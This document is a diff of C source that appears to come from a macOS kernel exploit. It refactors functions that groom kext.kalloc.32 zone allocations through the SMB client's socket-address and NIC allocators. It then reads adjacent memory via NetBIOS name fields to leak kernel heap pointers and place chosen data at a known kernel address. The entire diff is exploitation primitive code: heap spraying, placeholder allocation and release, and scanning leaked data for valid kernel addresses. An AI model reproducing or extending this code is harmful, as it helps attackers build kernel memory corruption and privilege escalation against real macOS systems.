@@ -5,6 +5,7 @@
 //  Created by admin on 12/27/21.
 //
 
+#include <assert.h>
 #include <stdlib.h>
 #include <string.h>
 
@@ -48,6 +49,8 @@ const int zone_kext_sizes[] = {
 
 // Scan the netbios name for `struct sock_addr_entry` with `addr` field
 int kmem_zkext_alloc_small_scan_nb_name(char* name, size_t len, uint16_t z_elem_size, uintptr_t* out) {
+    static_assert(sizeof(struct sock_addr_entry) > 16 && sizeof(struct sock_addr_entry) <= 32, "");
+    uint8_t sock_addr_entry_zone = 32;
     /// We  only need the data of `struct sock_addr_entry`. The netbios name consist of data from
     /// `snb_name` field of `struct sockaddr_nb` and data of succeding `struct sock_addr_entry`
     ///
@@ -59,26 +62,27 @@ int kmem_zkext_alloc_small_scan_nb_name(char* name, size_t len, uint16_t z_elem_
     ///                               skip_bytes
     ///                              <====================================>
     ///                                              len
-    int skip_bytes = 32 - offsetof(struct sockaddr_nb, snb_name);
-    int read_bytes = sizeof(uintptr_t) * 3;
+    int skip_bytes = sock_addr_entry_zone - offsetof(struct sockaddr_nb, snb_name);
+    int read_bytes = sizeof(struct sock_addr_entry);
     if (len < skip_bytes + read_bytes) {
         return ENOENT;
     }
     
-    uintptr_t ptr;
+    struct sock_addr_entry entry;
     /// Copy `addr` field to ptr
-    memcpy(&ptr, name + skip_bytes, sizeof(ptr));
+    memcpy(&entry, name + skip_bytes, sizeof(entry));
     
-    if (XE_VM_KERNEL_ADDRESS_VALID(ptr) && ptr % z_elem_size == 0) {
-        *out = ptr;
+    uintptr_t allocated_address = (uintptr_t)entry.addr;
+    if (XE_VM_KERNEL_ADDRESS_VALID(allocated_address) && allocated_address % z_elem_size == 0) {
+        *out = allocated_address;
         return 0;
     }
     
     return ENOENT;
 }
 
-
-int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, kmem_neighbor_reader_t reader, char* data, size_t data_size, struct kmem_zkext_alloc_small_entry* out) {
+// TODO: refactor API for clarity (first 8 bytes not controllable)
+int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, size_t data_size, struct kmem_zkext_alloc_small_entry* out) {
     size_t alloc_size = data_size + 8;
     xe_assert(alloc_size < 256);
     
@@ -102,18 +106,21 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, kmem_neighbor
         gap_info.addr_4.sin_len = sizeof(struct sockaddr_in);
         gap_info.addr_4.sin_addr.s_addr = gap_idx;
         
-        int error = kmem_allocator_prpw_allocate(element_allocator, 1, ^(void* ctx, uint8_t* len, sa_family_t* family, char** data_out, size_t* data_out_size, size_t index) {
-            *len = data_size + 8;
-            *family = AF_INET;
-            *data_out = data;
-            *data_out_size = data_size;
-        }, NULL);
+        /// Allocate a placeholder `struct sock_addr_entry` element in kext.kalloc.32 zone
+        int error = smb_nic_allocator_allocate(gap_allocator, &gap_info, 1, sizeof(gap_info));
         xe_assert_err(error);
         
-        error = smb_nic_allocator_allocate(gap_allocator, &gap_info, 1, sizeof(gap_info));
+        /// Allocate a `struct sock_addr_entry` element with given data in memory pointed by `entry->addr + 8`
+        error = kmem_allocator_prpw_allocate(element_allocator, 1, ^(void* ctx, uint8_t* address_len, sa_family_t* address_family, char** arbitary_data, size_t* arbitary_data_len, size_t index) {
+            *address_len = data_size + 8;
+            *address_family = AF_INET;
+            *arbitary_data = data;
+            *arbitary_data_len = data_size;
+        }, NULL);
         xe_assert_err(error);
     }
     
+    /// Release placeholder elements
     int error = smb_nic_allocator_destroy(&gap_allocator);
     xe_assert_err(error);
     
@@ -121,22 +128,40 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, kmem_neighbor
     for (int try = 0; try < MAX_TRIES; try++) {
         xe_log_debug("alloc session try %d / %d", try, MAX_TRIES);
         
-        uint8_t nb_len = 32 + sizeof(uintptr_t) * 3;
-        uint32_t ioc_len = 32;
-        uint8_t snb_name = 36;
+        static_assert(sizeof(struct sock_addr_entry) > 16 && sizeof(struct sock_addr_entry) <= 32, "");
+        uint8_t sock_addr_entry_zone = 32;
         
-        char data[sizeof(uint32_t) * 2 + (snb_name + 2) * 2];
-        kmem_neighbor_reader_read(reader, nb_len, ioc_len, snb_name, nb_len, ioc_len, snb_name, data, (uint32_t)sizeof(data));
+        /// Value of `sa_len` field of socket address
+        uint8_t nb_len = sock_addr_entry_zone + sizeof(struct sock_addr_entry);
+        /// `ioc_saddr_len` and `ioc_laddr_len`
+        uint32_t ioc_len = sock_addr_entry_zone;
+        /// Size of netbios name (`snb_name`) first segment
+        uint8_t snb_name = sizeof(struct sock_addr_entry) + (sock_addr_entry_zone - offsetof(struct sockaddr_nb, snb_name));
         
-        uint32_t saddr_len = *((uint32_t*)data);
-        xe_assert_cond(saddr_len, ==, snb_name + 2);
-        if (!kmem_zkext_alloc_small_scan_nb_name(&data[4], ioc_len + 2, zone_size, &value)) {
+        uint32_t server_name_size = snb_name;
+        char server_nb_name[server_name_size];
+        
+        uint32_t local_name_size = snb_name;
+        char local_nb_name[local_name_size];
+        
+        struct kmem_neighbor_reader_args params;
+        params.smb_addr = *smb_addr;
+        params.saddr_snb_len = nb_len;
+        params.saddr_ioc_len = ioc_len;
+        params.saddr_snb_name_seglen = snb_name;
+        params.laddr_snb_len = nb_len;
+        params.laddr_ioc_len = ioc_len;
+        params.laddr_snb_name_seglen = snb_name;
+        
+        kmem_neighbor_reader_read(&params, server_nb_name, &server_name_size, local_nb_name, &local_name_size);
+        xe_assert_cond(server_name_size, ==, snb_name + 2);
+        xe_assert_cond(local_name_size, ==, snb_name + 2);
+        
+        if (!kmem_zkext_alloc_small_scan_nb_name(server_nb_name, sizeof(server_nb_name), zone_size, &value)) {
             break;
         }
         
-        uint32_t paddr_len = *((uint32_t*)&data[saddr_len + 4]);
-        xe_assert_cond(paddr_len, ==, snb_name + 2);
-        if (!kmem_zkext_alloc_small_scan_nb_name(&data[saddr_len + 4 + 4], snb_name + 2, zone_size, &value)) {
+        if (!kmem_zkext_alloc_small_scan_nb_name(local_nb_name, sizeof(local_nb_name), zone_size, &value)) {
             break;
         }
     }
@@ -152,11 +177,11 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, kmem_neighbor
 }
 
 
-struct kmem_zkext_alloc_small_entry kmem_zkext_alloc_small(const struct sockaddr_in* smb_addr, kmem_neighbor_reader_t reader, char* data, size_t data_size) {
+struct kmem_zkext_alloc_small_entry kmem_zkext_alloc_small(const struct sockaddr_in* smb_addr, char* data, size_t data_size) {
     for (int i = 0; i < MAX_SESSIONS; i++) {
         xe_log_debug("alloc session %d / %d", i, MAX_SESSIONS);
         struct kmem_zkext_alloc_small_entry entry;
-        int error = kmem_zkext_alloc_small_try(smb_addr, reader, data, data_size, &entry);
+        int error = kmem_zkext_alloc_small_try(smb_addr, data, data_size, &entry);
         if (!error) {
             return entry;
         }
